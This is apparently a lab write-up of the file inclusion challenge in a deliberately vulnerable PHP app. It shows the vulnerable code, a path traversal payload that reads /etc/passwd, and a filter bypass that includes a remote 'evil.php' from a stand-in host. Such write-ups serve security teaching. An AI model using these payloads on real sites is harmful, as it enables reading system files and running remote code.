# File Inclusion

The file inclusion challenge gives a single instruction:

```
To include a file edit the ?page=index.php in the URL to determine which file is included. 
```

## Low

```php
$file = $_GET['page']; //The page we wish to display
```

```
?page=../../../../../../../../../../etc/passwd
```

Result:

```
root:x:0:0:root:/root:/bin/bash
[..redacted]
jsrn:x:1000:1000:jsrn,,,:/home/jsrn:/bin/zsh
```

## Medium

```php
$file = $_GET['page']; // The page we wish to display 

// Bad input validation
$file = str_replace("http://", "", $file);
$file = str_replace("https://", "", $file);
```

This input validation is indeed bad! It removes all instances of `http://` or `https://` from the file name before including it. In theory, this means we can no longer include a file by url.

*Except...*

```
?page=hthttp://tp://www.example.com/evil.php
```

still works! The str_replace only does one pass, so once the first is removed, the result is still:

```
?page=http://www.example.com/evil.php
```

Muahaha.